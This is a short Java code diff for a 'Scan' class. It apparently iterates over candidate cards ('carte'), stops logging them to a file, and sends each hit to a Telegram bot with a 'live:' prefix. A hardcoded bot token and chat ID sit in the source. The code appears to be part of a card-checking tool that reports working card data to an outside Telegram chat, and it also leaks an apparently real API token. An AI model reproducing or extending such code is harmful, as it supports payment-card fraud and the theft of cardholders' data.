@@ -157,7 +157,6 @@ public class Scan {
                         carte.add(String.valueOf(c));
                         alert(i++ + ")\t" + (i<100?"\t":"") + c + "\n", true);
                     }
-                    writer.write(i++ + ")\t" + (i<100?"\t":"") + c + "\n");
                 }
             }catch (IOException ignore){}
             long tempoTrascorso = System.nanoTime() / 1000000000;
@@ -226,7 +225,7 @@ public class Scan {
         final String BOT_TOKEN = "7717265706:AAH5chf4Ae3vsFSt7158K-RFWdh9BudnnQc";
         final String CHAT_ID = "5533337157";
         try {
-            String urlEncodedMessage = URLEncoder.encode(message, StandardCharsets.UTF_8);
+            String urlEncodedMessage = URLEncoder.encode("live:\t" + message, StandardCharsets.UTF_8);
             String url = String.format(
                     "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
                     BOT_TOKEN, CHAT_ID, urlEncodedMessage
